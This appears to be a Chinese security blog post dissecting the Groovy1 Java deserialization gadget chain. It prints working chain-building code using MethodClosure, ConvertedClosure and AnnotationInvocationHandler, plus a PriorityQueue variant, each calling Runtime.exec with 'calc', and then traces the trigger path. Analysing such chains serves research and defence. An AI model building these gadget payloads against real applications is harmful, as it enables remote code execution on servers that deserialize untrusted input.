# Groovy1

Groovy 是一种基于 JVM 的开发语言，具有类似于 Python，Ruby，Perl 和 Smalltalk 的功能。Groovy 既可以用作 Java 平台的编程语言，也可以用作脚本语言。groovy 编译之后生成 .class 文件，与 Java 编译生成的无异，因此可以在 JVM 上运行。

## exp

```java
public static void main(String[] args) throws Exception {

//封装我们需要执行的对象
MethodClosure    methodClosure = new MethodClosure("calc", "execute");
ConvertedClosure closure       = new ConvertedClosure(methodClosure, "entrySet");

Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor<?> constructor = c.getDeclaredConstructors()[0];
constructor.setAccessible(true);

// 创建 ConvertedClosure 的动态代理类实例
Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
new Class[]{Map.class}, closure);

// 使用动态代理初始化 AnnotationInvocationHandler
InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler);
}
```

使用prioritequeye

```java
final ConvertedClosure closure = new ConvertedClosure(new MethodClosure(Runtime.getRuntime(), "exec"), "compare");
Comparator proxy = (Comparator)Gadgets.createProxy(closure, Comparator.class);
PriorityQueue<Object> queue = new PriorityQueue<Object>(2, proxy);
queue.add(new String[]{"calc"});
queue.add("calc");
```



## 分析

### MethodClosure

![image-20220513100940785](https://img.dem0dem0.top/images/image-20220513100940785.png)

初始化的有两个参数一个是对象，一个是对象的方法名称.我们可以大概理解成为===> 一个类的方法的存储 ==》 Method.他的docall方法就是invoke.

![image-20220513101036201](https://img.dem0dem0.top/images/image-20220513101036201.png)

所以我们这样写代码就可以执行

```java
MethodClosure exec = new MethodClosure(Runtime.getRuntime(), "exec");
Method m  = MethodClosure.class.getDeclaredMethod("doCall", Object.class);
m.setAccessible(true);
m.invoke(exec, "calc");

MethodClosure exec = new MethodClosure(Runtime.getRuntime(), "exec");
exec.call("calc");
```

所以很清楚这里就是触发的位置。

### String.execute() 方法

在`Groovy`中可以使用以下的方式来执行sh命令

```
"ls".execute();
```

在java中的写法就是

```java
MethodClosure methodClosure = new MethodClosure("calc", "execute");
methodClosure.call();
```

### ConvertedClosure

这个类是一个通用适配器，用来将闭包和java的接口对应。

ConvertedClosure 实现了 ConversionHandler 类，而 ConversionHandler 又实现了 InvocationHandler。所以说 ConvertedClosure 本身就是一个动态代理类。

![image-20220513102639014](https://img.dem0dem0.top/images/image-20220513102639014.png)

可以看到整个类除了一些基本方法，会直接调用，其他的都是invokeCustom来实现的。`ConvertedClosure的method`==>和代理调用时的方法一致。

![image-20220513102713229](https://img.dem0dem0.top/images/image-20220513102713229.png)

像什么就不用我多说了把。看到这里就明白这条链的触发逻辑了。后面自然是使用 AnnotationInvocationHandler 将 ConvertedClosure 代理成 Map 类。这样在反序列化。

### AnnotationInvocationHandler

![image-20220513103129245](https://img.dem0dem0.top/images/image-20220513103129245.png)

主要是给大家看一下他的初始化。

## 分析

![image-20220513103744938](https://img.dem0dem0.top/images/image-20220513103744938.png)

AnnotationInvocationHandler#readobject => `handler(用closure代理了map接口)#entrySet` ==> `ConversionHandler#invoke`=>`ConvertedClosure#invokeCustom`==>call方法。

```java
Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(),
            new Class[]{Map.class}, closure);
```

所以这条利用链子真的牛皮！！！！。

## upupup!

这里按道理来说只要找一个readobject中会调用handler方法的就可以了。

就是说 一个类，他有一个属性(handler)，然后整个属性被handler代理了，并且在readobject中有一个对这个属性的方法的调用，然后他就可以执行命令了。想挖一下((())).